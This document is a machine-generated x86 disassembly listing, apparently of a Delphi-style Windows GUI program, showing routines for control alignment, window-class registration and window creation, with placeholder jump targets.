mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_45863d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_4587cc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_4587fb ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_458884
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_459078
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418c68
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_418dc4
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_458444
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_45903c
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_418e40
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_418dc4
mov edx eax
mov ecx ebx
mov eax edi
call sub_4583b8
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_4589f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_459078
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_45903c
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_45903c
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_458a48
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_4589f4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_458b27
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_458884
pop ecx
push ebp
mov al 0x2
call sub_458884
pop ecx
push ebp
mov al 0x3
call sub_458884
pop ecx
push ebp
mov al 0x4
call sub_458884
pop ecx
push ebp
mov al 0x5
call sub_458884
pop ecx
push ebp
mov al 0x6
call sub_458884
pop ecx
push ebp
xor eax eax
call sub_458884
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_4033e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_458b4c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45c684
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_458be0
xor eax eax
push ebp
push sub_458bd3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_458be8
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_458c10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_458cd5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_455450
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_459078
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458cdc
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45903c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418c68
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4551bc
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418dc4
xor ecx ecx
mov edx 0xb03e
call sub_456c00
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45903c
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_458ce4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_459078
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_458be0
xor edx edx
push ebp
push sub_458dcb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_459078
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45903c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418c68
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_418dc4
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4031ec
mov eax [ ebp - 0x4 ]
call sub_458be8
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45903c
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_454f60
mov dl 0x4
call sub_454f60
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_418cb4
sub_458e38
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_46cc58
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_47097c
sub_458e58
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_454340
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_454340
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_454340
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_458ea4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_454368
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_454368
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_454368
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_458eec
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4033e8
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_456c00
mov edx ebx
mov eax edi
call sub_458e58
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_456c00
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_456c00
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax edi
call sub_45c684
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_456c00
mov eax edi
call sub_459a3c
jmp r-xdata
mov edx ebx
mov eax edi
call sub_458b4c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_458fc0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_456c00
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax esi
call sub_45c684
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_458e38
mov eax ebp
call sub_4598a0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_458ea4
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_456c00
mov eax esi
call sub_458c08
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_455e94
sub_45903c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_418dc4
mov edx edi
mov eax ebp
call sub_418dc4
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_459098
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_459078
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_45903c
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_4590d8
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_459098
add esp 0x10
retn
sub_459100
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_45916c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_456090
test al al
je r-xdata
mov eax ebx
call sub_4560c0
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_4033e8
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_4033e8
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_4033e8
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_4591d4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4592f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402bf8
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_45916c
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_45c380
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_40313c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041e0
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4592f9
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_459300
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4594c1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_4527ec
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_4527ec
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cfdc
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cfdc
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408be0
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_45c690
push 0x1
mov eax [ esi + 0x68 ]
call sub_4247bc
mov ecx eax
mov edx 0x30
mov eax esi
call sub_456c00
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_45c380
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4594c8
lea eax [ ebp - 0xc0 ]
call sub_403f7c
retn
mov eax esi
mov si 0xffee
call sub_4033e8
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_4594d0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406cd8
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_459510
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d5f0
mov eax esi
call sub_41d540
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41d540
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41d5f8
pop esi
pop ebx
retn
sub_459548
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41f824
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41f758
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41f758
mov eax esi
call sub_41f82c
add esp 0x10
pop esi
pop ebx
retn
sub_4595b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_45959c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_418dc4
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418dc4
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_459688
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_456f38
mov eax [ ebp - 0x8 ]
push eax
push sub_459510
mov eax [ ebp - 0x8 ]
push eax
push sub_459548
push ebp
call sub_4595b0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4596e4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4559c0
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408b94
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408ba8
mov ecx eax
mov edx edi
mov eax ebx
call sub_4559d0
mov eax r-xdata
call sub_408bb4
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_454474
mov eax ebx
